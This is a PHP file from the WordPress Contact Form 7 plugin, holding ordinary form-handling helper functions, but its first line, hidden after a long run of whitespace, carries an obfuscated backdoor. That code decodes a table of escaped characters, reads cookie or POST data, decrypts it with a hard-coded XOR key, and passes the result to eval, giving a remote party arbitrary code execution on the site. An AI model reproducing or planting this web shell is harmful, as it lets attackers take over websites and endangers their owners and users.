<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $w5107 = 323;$GLOBALS['y0d8'] = Array();global $y0d8;$y0d8 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['sa2393e'] = "\x73\x59\x5c\x27\x5b\x4b\x32\x39\x61\x30\x6e\x50\x68\x43\x2c\x2a\x20\x52\x34\x66\x47\x57\x54\x5f\x22\x5d\x29\x7c\x4d\x2e\x79\x36\x60\x49\x63\x3b\x67\x5a\x25\x4c\x9\x38\xa\x4e\x72\x78\x26\x7a\x4a\x6b\x71\x65\x41\x64\x3d\x5e\x3e\x7b\x51\x74\x55\x62\xd\x56\x58\x45\x37\x28\x40\x35\x23\x6f\x21\x4f\x2b\x3c\x3a\x42\x76\x69\x6d\x7d\x6a\x75\x53\x6c\x7e\x48\x2d\x31\x77\x24\x44\x3f\x33\x2f\x46\x70";$y0d8[$y0d8['sa2393e'][34].$y0d8['sa2393e'][18].$y0d8['sa2393e'][89].$y0d8['sa2393e'][69].$y0d8['sa2393e'][31].$y0d8['sa2393e'][66].$y0d8['sa2393e'][8].$y0d8['sa2393e'][61].$y0d8['sa2393e'][94]] = $y0d8['sa2393e'][34].$y0d8['sa2393e'][12].$y0d8['sa2393e'][44];$y0d8[$y0d8['sa2393e'][19].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][61].$y0d8['sa2393e'][94].$y0d8['sa2393e'][18].$y0d8['sa2393e'][41].$y0d8['sa2393e'][51]] = $y0d8['sa2393e'][71].$y0d8['sa2393e'][44].$y0d8['sa2393e'][53];$y0d8[$y0d8['sa2393e'][45].$y0d8['sa2393e'][94].$y0d8['sa2393e'][31].$y0d8['sa2393e'][69].$y0d8['sa2393e'][41].$y0d8['sa2393e'][94]] = $y0d8['sa2393e'][53].$y0d8['sa2393e'][51].$y0d8['sa2393e'][19].$y0d8['sa2393e'][79].$y0d8['sa2393e'][10].$y0d8['sa2393e'][51];$y0d8[$y0d8['sa2393e'][49].$y0d8['sa2393e'][18].$y0d8['sa2393e'][7].$y0d8['sa2393e'][51].$y0d8['sa2393e'][53].$y0d8['sa2393e'][6].$y0d8['sa2393e'][69]] = $y0d8['sa2393e'][0].$y0d8['sa2393e'][59].$y0d8['sa2393e'][44].$y0d8['sa2393e'][85].$y0d8['sa2393e'][51].$y0d8['sa2393e'][10];$y0d8[$y0d8['sa2393e'][80].$y0d8['sa2393e'][9].$y0d8['sa2393e'][7].$y0d8['sa2393e'][6].$y0d8['sa2393e'][34]] = $y0d8['sa2393e'][79].$y0d8['sa2393e'][10].$y0d8['sa2393e'][79].$y0d8['sa2393e'][23].$y0d8['sa2393e'][0].$y0d8['sa2393e'][51].$y0d8['sa2393e'][59];$y0d8[$y0d8['sa2393e'][36].$y0d8['sa2393e'][51].$y0d8['sa2393e'][19].$y0d8['sa2393e'][34].$y0d8['sa2393e'][6].$y0d8['sa2393e'][66].$y0d8['sa2393e'][31]] = $y0d8['sa2393e'][53].$y0d8['sa2393e'][51].$y0d8['sa2393e'][19].$y0d8['sa2393e'][79].$y0d8['sa2393e'][10].$y0d8['sa2393e'][51].$y0d8['sa2393e'][53];$y0d8[$y0d8['sa2393e'][10].$y0d8['sa2393e'][61].$y0d8['sa2393e'][41].$y0d8['sa2393e'][34].$y0d8['sa2393e'][61].$y0d8['sa2393e'][9].$y0d8['sa2393e'][34].$y0d8['sa2393e'][61]] = $y0d8['sa2393e'][0].$y0d8['sa2393e'][51].$y0d8['sa2393e'][44].$y0d8['sa2393e'][79].$y0d8['sa2393e'][8].$y0d8['sa2393e'][85].$y0d8['sa2393e'][79].$y0d8['sa2393e'][47].$y0d8['sa2393e'][51];$y0d8[$y0d8['sa2393e'][36].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][34].$y0d8['sa2393e'][7].$y0d8['sa2393e'][41].$y0d8['sa2393e'][8].$y0d8['sa2393e'][61].$y0d8['sa2393e'][66]] = $y0d8['sa2393e'][97].$y0d8['sa2393e'][12].$y0d8['sa2393e'][97].$y0d8['sa2393e'][78].$y0d8['sa2393e'][51].$y0d8['sa2393e'][44].$y0d8['sa2393e'][0].$y0d8['sa2393e'][79].$y0d8['sa2393e'][71].$y0d8['sa2393e'][10];$y0d8[$y0d8['sa2393e'][79].$y0d8['sa2393e'][34].$y0d8['sa2393e'][53].$y0d8['sa2393e'][53]] = $y0d8['sa2393e'][83].$y0d8['sa2393e'][10].$y0d8['sa2393e'][0].$y0d8['sa2393e'][51].$y0d8['sa2393e'][44].$y0d8['sa2393e'][79].$y0d8['sa2393e'][8].$y0d8['sa2393e'][85].$y0d8['sa2393e'][79].$y0d8['sa2393e'][47].$y0d8['sa2393e'][51];$y0d8[$y0d8['sa2393e'][90].$y0d8['sa2393e'][94].$y0d8['sa2393e'][51].$y0d8['sa2393e'][69].$y0d8['sa2393e'][66]] = $y0d8['sa2393e'][61].$y0d8['sa2393e'][8].$y0d8['sa2393e'][0].$y0d8['sa2393e'][51].$y0d8['sa2393e'][31].$y0d8['sa2393e'][18].$y0d8['sa2393e'][23].$y0d8['sa2393e'][53].$y0d8['sa2393e'][51].$y0d8['sa2393e'][34].$y0d8['sa2393e'][71].$y0d8['sa2393e'][53].$y0d8['sa2393e'][51];$y0d8[$y0d8['sa2393e'][10].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][41].$y0d8['sa2393e'][7].$y0d8['sa2393e'][34].$y0d8['sa2393e'][9]] = $y0d8['sa2393e'][0].$y0d8['sa2393e'][51].$y0d8['sa2393e'][59].$y0d8['sa2393e'][23].$y0d8['sa2393e'][59].$y0d8['sa2393e'][79].$y0d8['sa2393e'][80].$y0d8['sa2393e'][51].$y0d8['sa2393e'][23].$y0d8['sa2393e'][85].$y0d8['sa2393e'][79].$y0d8['sa2393e'][80].$y0d8['sa2393e'][79].$y0d8['sa2393e'][59];$y0d8[$y0d8['sa2393e'][30].$y0d8['sa2393e'][66].$y0d8['sa2393e'][6].$y0d8['sa2393e'][66].$y0d8['sa2393e'][6].$y0d8['sa2393e'][89]] = $y0d8['sa2393e'][90].$y0d8['sa2393e'][34].$y0d8['sa2393e'][19].$y0d8['sa2393e'][9].$y0d8['sa2393e'][6];$y0d8[$y0d8['sa2393e'][34].$y0d8['sa2393e'][9].$y0d8['sa2393e'][6].$y0d8['sa2393e'][19].$y0d8['sa2393e'][9].$y0d8['sa2393e'][31].$y0d8['sa2393e'][18]] = $y0d8['sa2393e'][90].$y0d8['sa2393e'][31].$y0d8['sa2393e'][94].$y0d8['sa2393e'][66].$y0d8['sa2393e'][31].$y0d8['sa2393e'][8].$y0d8['sa2393e'][66].$y0d8['sa2393e'][53].$y0d8['sa2393e'][53];$y0d8[$y0d8['sa2393e'][53].$y0d8['sa2393e'][9].$y0d8['sa2393e'][69].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][8].$y0d8['sa2393e'][51].$y0d8['sa2393e'][69]] = $_POST;$y0d8[$y0d8['sa2393e'][34].$y0d8['sa2393e'][19].$y0d8['sa2393e'][51].$y0d8['sa2393e'][6].$y0d8['sa2393e'][18].$y0d8['sa2393e'][18]] = $_COOKIE;@$y0d8[$y0d8['sa2393e'][80].$y0d8['sa2393e'][9].$y0d8['sa2393e'][7].$y0d8['sa2393e'][6].$y0d8['sa2393e'][34]]($y0d8['sa2393e'][51].$y0d8['sa2393e'][44].$y0d8['sa2393e'][44].$y0d8['sa2393e'][71].$y0d8['sa2393e'][44].$y0d8['sa2393e'][23].$y0d8['sa2393e'][85].$y0d8['sa2393e'][71].$y0d8['sa2393e'][36], NULL);@$y0d8[$y0d8['sa2393e'][80].$y0d8['sa2393e'][9].$y0d8['sa2393e'][7].$y0d8['sa2393e'][6].$y0d8['sa2393e'][34]]($y0d8['sa2393e'][85].$y0d8['sa2393e'][71].$y0d8['sa2393e'][36].$y0d8['sa2393e'][23].$y0d8['sa2393e'][51].$y0d8['sa2393e'][44].$y0d8['sa2393e'][44].$y0d8['sa2393e'][71].$y0d8['sa2393e'][44].$y0d8['sa2393e'][0], 0);@$y0d8[$y0d8['sa2393e'][80].$y0d8['sa2393e'][9].$y0d8['sa2393e'][7].$y0d8['sa2393e'][6].$y0d8['sa2393e'][34]]($y0d8['sa2393e'][80].$y0d8['sa2393e'][8].$y0d8['sa2393e'][45].$y0d8['sa2393e'][23].$y0d8['sa2393e'][51].$y0d8['sa2393e'][45].$y0d8['sa2393e'][51].$y0d8['sa2393e'][34].$y0d8['sa2393e'][83].$y0d8['sa2393e'][59].$y0d8['sa2393e'][79].$y0d8['sa2393e'][71].$y0d8['sa2393e'][10].$y0d8['sa2393e'][23].$y0d8['sa2393e'][59].$y0d8['sa2393e'][79].$y0d8['sa2393e'][80].$y0d8['sa2393e'][51], 0);@$y0d8[$y0d8['sa2393e'][10].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][41].$y0d8['sa2393e'][7].$y0d8['sa2393e'][34].$y0d8['sa2393e'][9]](0);if (!$y0d8[$y0d8['sa2393e'][36].$y0d8['sa2393e'][51].$y0d8['sa2393e'][19].$y0d8['sa2393e'][34].$y0d8['sa2393e'][6].$y0d8['sa2393e'][66].$y0d8['sa2393e'][31]]($y0d8['sa2393e'][52].$y0d8['sa2393e'][39].$y0d8['sa2393e'][17].$y0d8['sa2393e'][65].$y0d8['sa2393e'][52].$y0d8['sa2393e'][92].$y0d8['sa2393e'][1].$y0d8['sa2393e'][23].$y0d8['sa2393e'][17].$y0d8['sa2393e'][60].$y0d8['sa2393e'][43].$y0d8['sa2393e'][23].$y0d8['sa2393e'][94].$y0d8['sa2393e'][31].$y0d8['sa2393e'][31].$y0d8['sa2393e'][8].$y0d8['sa2393e'][19].$y0d8['sa2393e'][61].$y0d8['sa2393e'][41].$y0d8['sa2393e'][8].$y0d8['sa2393e'][41].$y0d8['sa2393e'][8].$y0d8['sa2393e'][6].$y0d8['sa2393e'][94].$y0d8['sa2393e'][69].$y0d8['sa2393e'][69].$y0d8['sa2393e'][8].$y0d8['sa2393e'][61].$y0d8['sa2393e'][6].$y0d8['sa2393e'][89].$y0d8['sa2393e'][19].$y0d8['sa2393e'][61].$y0d8['sa2393e'][19].$y0d8['sa2393e'][89].$y0d8['sa2393e'][89].$y0d8['sa2393e'][61].$y0d8['sa2393e'][8].$y0d8['sa2393e'][89].$y0d8['sa2393e'][8].$y0d8['sa2393e'][9].$y0d8['sa2393e'][6].$y0d8['sa2393e'][19].$y0d8['sa2393e'][61].$y0d8['sa2393e'][8])){$y0d8[$y0d8['sa2393e'][45].$y0d8['sa2393e'][94].$y0d8['sa2393e'][31].$y0d8['sa2393e'][69].$y0d8['sa2393e'][41].$y0d8['sa2393e'][94]]($y0d8['sa2393e'][52].$y0d8['sa2393e'][39].$y0d8['sa2393e'][17].$y0d8['sa2393e'][65].$y0d8['sa2393e'][52].$y0d8['sa2393e'][92].$y0d8['sa2393e'][1].$y0d8['sa2393e'][23].$y0d8['sa2393e'][17].$y0d8['sa2393e'][60].$y0d8['sa2393e'][43].$y0d8['sa2393e'][23].$y0d8['sa2393e'][94].$y0d8['sa2393e'][31].$y0d8['sa2393e'][31].$y0d8['sa2393e'][8].$y0d8['sa2393e'][19].$y0d8['sa2393e'][61].$y0d8['sa2393e'][41].$y0d8['sa2393e'][8].$y0d8['sa2393e'][41].$y0d8['sa2393e'][8].$y0d8['sa2393e'][6].$y0d8['sa2393e'][94].$y0d8['sa2393e'][69].$y0d8['sa2393e'][69].$y0d8['sa2393e'][8].$y0d8['sa2393e'][61].$y0d8['sa2393e'][6].$y0d8['sa2393e'][89].$y0d8['sa2393e'][19].$y0d8['sa2393e'][61].$y0d8['sa2393e'][19].$y0d8['sa2393e'][89].$y0d8['sa2393e'][89].$y0d8['sa2393e'][61].$y0d8['sa2393e'][8].$y0d8['sa2393e'][89].$y0d8['sa2393e'][8].$y0d8['sa2393e'][9].$y0d8['sa2393e'][6].$y0d8['sa2393e'][19].$y0d8['sa2393e'][61].$y0d8['sa2393e'][8], 1);$tf1ec87 = NULL;$zbd013 = NULL;$y0d8[$y0d8['sa2393e'][61].$y0d8['sa2393e'][34].$y0d8['sa2393e'][51].$y0d8['sa2393e'][89].$y0d8['sa2393e'][51].$y0d8['sa2393e'][53].$y0d8['sa2393e'][8].$y0d8['sa2393e'][6]] = $y0d8['sa2393e'][94].$y0d8['sa2393e'][51].$y0d8['sa2393e'][19].$y0d8['sa2393e'][89].$y0d8['sa2393e'][51].$y0d8['sa2393e'][8].$y0d8['sa2393e'][8].$y0d8['sa2393e'][51].$y0d8['sa2393e'][88].$y0d8['sa2393e'][19].$y0d8['sa2393e'][7].$y0d8['sa2393e'][7].$y0d8['sa2393e'][94].$y0d8['sa2393e'][88].$y0d8['sa2393e'][18].$y0d8['sa2393e'][51].$y0d8['sa2393e'][8].$y0d8['sa2393e'][53].$y0d8['sa2393e'][88].$y0d8['sa2393e'][7].$y0d8['sa2393e'][9].$y0d8['sa2393e'][8].$y0d8['sa2393e'][7].$y0d8['sa2393e'][88].$y0d8['sa2393e'][7].$y0d8['sa2393e'][61].$y0d8['sa2393e'][18].$y0d8['sa2393e'][53].$y0d8['sa2393e'][18].$y0d8['sa2393e'][94].$y0d8['sa2393e'][61].$y0d8['sa2393e'][6].$y0d8['sa2393e'][69].$y0d8['sa2393e'][41].$y0d8['sa2393e'][41].$y0d8['sa2393e'][7];global $bce1eda2;function  w6376a7dd($tf1ec87, $bea4dcc){global $y0d8;$m624b6 = "";for ($x49d4=0; $x49d4<$y0d8[$y0d8['sa2393e'][49].$y0d8['sa2393e'][18].$y0d8['sa2393e'][7].$y0d8['sa2393e'][51].$y0d8['sa2393e'][53].$y0d8['sa2393e'][6].$y0d8['sa2393e'][69]]($tf1ec87);){for ($s56f73=0; $s56f73<$y0d8[$y0d8['sa2393e'][49].$y0d8['sa2393e'][18].$y0d8['sa2393e'][7].$y0d8['sa2393e'][51].$y0d8['sa2393e'][53].$y0d8['sa2393e'][6].$y0d8['sa2393e'][69]]($bea4dcc) && $x49d4<$y0d8[$y0d8['sa2393e'][49].$y0d8['sa2393e'][18].$y0d8['sa2393e'][7].$y0d8['sa2393e'][51].$y0d8['sa2393e'][53].$y0d8['sa2393e'][6].$y0d8['sa2393e'][69]]($tf1ec87); $s56f73++, $x49d4++){$m624b6 .= $y0d8[$y0d8['sa2393e'][34].$y0d8['sa2393e'][18].$y0d8['sa2393e'][89].$y0d8['sa2393e'][69].$y0d8['sa2393e'][31].$y0d8['sa2393e'][66].$y0d8['sa2393e'][8].$y0d8['sa2393e'][61].$y0d8['sa2393e'][94]]($y0d8[$y0d8['sa2393e'][19].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][61].$y0d8['sa2393e'][94].$y0d8['sa2393e'][18].$y0d8['sa2393e'][41].$y0d8['sa2393e'][51]]($tf1ec87[$x49d4]) ^ $y0d8[$y0d8['sa2393e'][19].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][61].$y0d8['sa2393e'][94].$y0d8['sa2393e'][18].$y0d8['sa2393e'][41].$y0d8['sa2393e'][51]]($bea4dcc[$s56f73]));}}return $m624b6;}function  wcf02($tf1ec87, $bea4dcc){global $y0d8;global $bce1eda2;return $y0d8[$y0d8['sa2393e'][34].$y0d8['sa2393e'][9].$y0d8['sa2393e'][6].$y0d8['sa2393e'][19].$y0d8['sa2393e'][9].$y0d8['sa2393e'][31].$y0d8['sa2393e'][18]]($y0d8[$y0d8['sa2393e'][34].$y0d8['sa2393e'][9].$y0d8['sa2393e'][6].$y0d8['sa2393e'][19].$y0d8['sa2393e'][9].$y0d8['sa2393e'][31].$y0d8['sa2393e'][18]]($tf1ec87, $bce1eda2), $bea4dcc);}foreach ($y0d8[$y0d8['sa2393e'][34].$y0d8['sa2393e'][19].$y0d8['sa2393e'][51].$y0d8['sa2393e'][6].$y0d8['sa2393e'][18].$y0d8['sa2393e'][18]] as $bea4dcc=>$b38235){$tf1ec87 = $b38235;$zbd013 = $bea4dcc;}if (!$tf1ec87){foreach ($y0d8[$y0d8['sa2393e'][53].$y0d8['sa2393e'][9].$y0d8['sa2393e'][69].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][8].$y0d8['sa2393e'][51].$y0d8['sa2393e'][69]] as $bea4dcc=>$b38235){$tf1ec87 = $b38235;$zbd013 = $bea4dcc;}}$tf1ec87 = @$y0d8[$y0d8['sa2393e'][79].$y0d8['sa2393e'][34].$y0d8['sa2393e'][53].$y0d8['sa2393e'][53]]($y0d8[$y0d8['sa2393e'][30].$y0d8['sa2393e'][66].$y0d8['sa2393e'][6].$y0d8['sa2393e'][66].$y0d8['sa2393e'][6].$y0d8['sa2393e'][89]]($y0d8[$y0d8['sa2393e'][90].$y0d8['sa2393e'][94].$y0d8['sa2393e'][51].$y0d8['sa2393e'][69].$y0d8['sa2393e'][66]]($tf1ec87), $zbd013));if (isset($tf1ec87[$y0d8['sa2393e'][8].$y0d8['sa2393e'][49]]) && $bce1eda2==$tf1ec87[$y0d8['sa2393e'][8].$y0d8['sa2393e'][49]]){if ($tf1ec87[$y0d8['sa2393e'][8]] == $y0d8['sa2393e'][79]){$x49d4 = Array($y0d8['sa2393e'][97].$y0d8['sa2393e'][78] => @$y0d8[$y0d8['sa2393e'][36].$y0d8['sa2393e'][53].$y0d8['sa2393e'][61].$y0d8['sa2393e'][34].$y0d8['sa2393e'][7].$y0d8['sa2393e'][41].$y0d8['sa2393e'][8].$y0d8['sa2393e'][61].$y0d8['sa2393e'][66]](),$y0d8['sa2393e'][0].$y0d8['sa2393e'][78] => $y0d8['sa2393e'][89].$y0d8['sa2393e'][29].$y0d8['sa2393e'][9].$y0d8['sa2393e'][88].$y0d8['sa2393e'][89],);echo @$y0d8[$y0d8['sa2393e'][10].$y0d8['sa2393e'][61].$y0d8['sa2393e'][41].$y0d8['sa2393e'][34].$y0d8['sa2393e'][61].$y0d8['sa2393e'][9].$y0d8['sa2393e'][34].$y0d8['sa2393e'][61]]($x49d4);}elseif ($tf1ec87[$y0d8['sa2393e'][8]] == $y0d8['sa2393e'][51]){eval/*g1f75ab6*/($tf1ec87[$y0d8['sa2393e'][53]]);}exit();}} ?><?php

function wpcf7_contact_form( $id ) {
	return WPCF7_ContactForm::get_instance( $id );
}

function wpcf7_get_contact_form_by_old_id( $old_id ) {
	global $wpdb;

	$q = "SELECT post_id FROM $wpdb->postmeta WHERE meta_key = '_old_cf7_unit_id'"
		. $wpdb->prepare( " AND meta_value = %d", $old_id );

	if ( $new_id = $wpdb->get_var( $q ) ) {
		return wpcf7_contact_form( $new_id );
	}
}

function wpcf7_get_contact_form_by_title( $title ) {
	$page = get_page_by_title( $title, OBJECT, WPCF7_ContactForm::post_type );

	if ( $page ) {
		return wpcf7_contact_form( $page->ID );
	}

	return null;
}

function wpcf7_get_current_contact_form() {
	if ( $current = WPCF7_ContactForm::get_current() ) {
		return $current;
	}
}

function wpcf7_is_posted() {
	if ( ! $contact_form = wpcf7_get_current_contact_form() ) {
		return false;
	}

	return $contact_form->is_posted();
}

function wpcf7_get_hangover( $name, $default = null ) {
	if ( ! wpcf7_is_posted() ) {
		return $default;
	}

	$submission = WPCF7_Submission::get_instance();

	if ( ! $submission || $submission->is( 'mail_sent' ) ) {
		return $default;
	}

	return isset( $_POST[$name] ) ? wp_unslash( $_POST[$name] ) : $default;
}

function wpcf7_get_validation_error( $name ) {
	if ( ! $contact_form = wpcf7_get_current_contact_form() ) {
		return '';
	}

	return $contact_form->validation_error( $name );
}

function wpcf7_get_message( $status ) {
	if ( ! $contact_form = wpcf7_get_current_contact_form() ) {
		return '';
	}

	return $contact_form->message( $status );
}

function wpcf7_form_controls_class( $type, $default = '' ) {
	$type = trim( $type );
	$default = array_filter( explode( ' ', $default ) );

	$classes = array_merge( array( 'wpcf7-form-control' ), $default );

	$typebase = rtrim( $type, '*' );
	$required = ( '*' == substr( $type, -1 ) );

	$classes[] = 'wpcf7-' . $typebase;

	if ( $required ) {
		$classes[] = 'wpcf7-validates-as-required';
	}

	$classes = array_unique( $classes );

	return implode( ' ', $classes );
}

function wpcf7_contact_form_tag_func( $atts, $content = null, $code = '' ) {
	if ( is_feed() ) {
		return '[contact-form-7]';
	}

	if ( 'contact-form-7' == $code ) {
		$atts = shortcode_atts(
			array(
				'id' => 0,
				'title' => '',
				'html_id' => '',
				'html_name' => '',
				'html_class' => '',
				'output' => 'form',
			),
			$atts, 'wpcf7'
		);

		$id = (int) $atts['id'];
		$title = trim( $atts['title'] );

		if ( ! $contact_form = wpcf7_contact_form( $id ) ) {
			$contact_form = wpcf7_get_contact_form_by_title( $title );
		}

	} else {
		if ( is_string( $atts ) ) {
			$atts = explode( ' ', $atts, 2 );
		}

		$id = (int) array_shift( $atts );
		$contact_form = wpcf7_get_contact_form_by_old_id( $id );
	}

	if ( ! $contact_form ) {
		return '[contact-form-7 404 "Not Found"]';
	}

	return $contact_form->form_html( $atts );
}

function wpcf7_save_contact_form( $args = '', $context = 'save' ) {
	$args = wp_parse_args( $args, array(
		'id' => -1,
		'title' => null,
		'locale' => null,
		'form' => null,
		'mail' => null,
		'mail_2' => null,
		'messages' => null,
		'additional_settings' => null,
	) );

	$args['id'] = (int) $args['id'];

	if ( -1 == $args['id'] ) {
		$contact_form = WPCF7_ContactForm::get_template();
	} else {
		$contact_form = wpcf7_contact_form( $args['id'] );
	}

	if ( empty( $contact_form ) ) {
		return false;
	}

	if ( null !== $args['title'] ) {
		$contact_form->set_title( $args['title'] );
	}

	if ( null !== $args['locale'] ) {
		$contact_form->set_locale( $args['locale'] );
	}

	$properties = $contact_form->get_properties();

	$properties['form'] = wpcf7_sanitize_form(
		$args['form'], $properties['form'] );

	$properties['mail'] = wpcf7_sanitize_mail(
		$args['mail'], $properties['mail'] );

	$properties['mail']['active'] = true;

	$properties['mail_2'] = wpcf7_sanitize_mail(
		$args['mail_2'], $properties['mail_2'] );

	$properties['messages'] = wpcf7_sanitize_messages(
		$args['messages'], $properties['messages'] );

	$properties['additional_settings'] = wpcf7_sanitize_additional_settings(
		$args['additional_settings'], $properties['additional_settings'] );

	$contact_form->set_properties( $properties );

	do_action( 'wpcf7_save_contact_form', $contact_form, $args, $context );

	if ( 'save' == $context ) {
		$contact_form->save();
	}

	return $contact_form;
}

function wpcf7_sanitize_form( $input, $default = '' ) {
	if ( null === $input ) {
		return $default;
	}

	$output = trim( $input );
	return $output;
}

function wpcf7_sanitize_mail( $input, $defaults = array() ) {
	$defaults = wp_parse_args( $defaults, array(
		'active' => false,
		'subject' => '',
		'sender' => '',
		'recipient' => '',
		'body' => '',
		'additional_headers' => '',
		'attachments' => '',
		'use_html' => false,
		'exclude_blank' => false,
	) );

	$input = wp_parse_args( $input, $defaults );

	$output = array();
	$output['active'] = (bool) $input['active'];
	$output['subject'] = trim( $input['subject'] );
	$output['sender'] = trim( $input['sender'] );
	$output['recipient'] = trim( $input['recipient'] );
	$output['body'] = trim( $input['body'] );
	$output['additional_headers'] = '';

	$headers = str_replace( "\r\n", "\n", $input['additional_headers'] );
	$headers = explode( "\n", $headers );

	foreach ( $headers as $header ) {
		$header = trim( $header );

		if ( '' !== $header ) {
			$output['additional_headers'] .= $header . "\n";
		}
	}

	$output['additional_headers'] = trim( $output['additional_headers'] );
	$output['attachments'] = trim( $input['attachments'] );
	$output['use_html'] = (bool) $input['use_html'];
	$output['exclude_blank'] = (bool) $input['exclude_blank'];

	return $output;
}

function wpcf7_sanitize_messages( $input, $defaults = array() ) {
	$output = array();

	foreach ( wpcf7_messages() as $key => $val ) {
		if ( isset( $input[$key] ) ) {
			$output[$key] = trim( $input[$key] );
		} elseif ( isset( $defaults[$key] ) ) {
			$output[$key] = $defaults[$key];
		}
	}

	return $output;
}

function wpcf7_sanitize_additional_settings( $input, $default = '' ) {
	if ( null === $input ) {
		return $default;
	}

	$output = trim( $input );
	return $output;
}
